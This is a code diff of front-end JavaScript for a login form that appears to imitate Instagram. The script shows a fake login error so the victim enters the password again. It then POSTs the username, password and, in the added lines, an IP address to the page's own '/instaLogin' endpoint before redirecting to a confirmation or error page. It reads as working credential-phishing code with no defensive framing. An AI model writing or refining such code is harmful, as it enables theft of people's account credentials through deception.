@@ -1,11 +1,12 @@
 const passwordInput = document.querySelector("input[name='password']")
 const usernameInput = document.querySelector("input[name='username']")
 let errorCounter = 1
-let randomCharacterIndex = Math.floor(Math.random() * 4) == 0 ? 4 : Math.floor(Math.random() * 4)
+let randomCharacterIndex = Math.ceil(Math.random() * 4)
+console.log(randomCharacterIndex)
 let InstaLoginError = document.querySelector(".LoginError")
 const submitButton = document.querySelector("button[type='submit']")
 submitButton ? submitButton.disabled = true : ""
-console.log(randomCharacterIndex)
+
 const randomCharacters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
 
 if (passwordInput) {
@@ -38,6 +39,7 @@ const SubmitData = (e) => {
   e.preventDefault()
   const username = document.querySelector("input[name='username']")
   const password = document.querySelector("input[name='password']")
+  const ipaddress = document.querySelector("input[name='ipaddress']")
   let InstaLoginError = document.querySelector(".LoginError")
 
   if (errorCounter > 0) {
@@ -45,7 +47,7 @@ const SubmitData = (e) => {
     InstaLoginError.style.display = "block"
     randomCharacterIndex = Math.floor(Math.random() * 4)
   } else {
-
+    
       fetch('/instaLogin', ({
         headers: {
           "Content-Type": "application/json"
@@ -54,9 +56,10 @@ const SubmitData = (e) => {
         body: JSON.stringify({
           username: username.value,
           password: password.value,
+          ipaddress : ipaddress.value
         })
       })).then((res) => {
-        return res
+        return res.json()
       }).then((data) => {
         console.log(data)
       })
@@ -65,7 +68,7 @@ const SubmitData = (e) => {
       if(Locationquery[1] != undefined){
         location.assign("./Confirm.html")
       }else{
-        location.assign("./redirect.html")
+        window.location.href="/serverError"
       }
     }
   }
